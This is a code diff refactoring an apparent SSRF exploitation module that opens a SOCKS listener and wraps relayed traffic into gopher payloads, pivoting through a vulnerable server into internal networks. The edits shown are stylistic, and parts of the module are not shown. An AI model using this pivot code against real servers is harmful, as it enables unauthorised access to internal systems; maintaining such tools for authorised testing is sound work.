@@ -30,11 +30,11 @@ class exploit():
     TIMEOUT     = 5
 
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.bind((self.HOST, self.PORT))
         server.listen(2)
-        logging.info("Listener ready on port {}".format(self.PORT))
+        logging.info(f"Listener ready on port {self.PORT}")
         try:
             while 1:
                 client, addr = server.accept()
@@ -43,20 +43,16 @@ class exploit():
             server.close()
 
     def child(self, sock, addr, requester, args):
-        
+
         if self.SOCKS:
             req = sock.recv(self.BUFSIZ)
             host, port, extra = self.decodesocks(req)
-            if extra == "":
-                dest = socket.inet_ntoa(host.encode())
-            else:
-                dest = extra
-            
+            dest = socket.inet_ntoa(host.encode()) if extra == "" else extra
             destport, = struct.unpack("!H", port.encode())
             sock.send(("\x00\x5a"+port+host).encode() )
-            
+
         data = sock.recv(self.BUFSIZ)
-        
+
         try:
             encodeddata = urllib.parse.quote(data)
             payload = wrapper_gopher(encodeddata, dest , str(destport))
@@ -80,10 +76,12 @@ class exploit():
 
         port = req[2:4]
         host = req[4:8]
-        if host[0] == '\x00' and host[1] == '\x00' and host[2] == '\x00' and host[3] != '\x00':
-            byname = True
-        else:
-            byname = False
+        byname = (
+            host[0] == '\x00'
+            and host[1] == '\x00'
+            and host[2] == '\x00'
+            and host[3] != '\x00'
+        )
 
         # NOTE: seems useless
         userid = ""
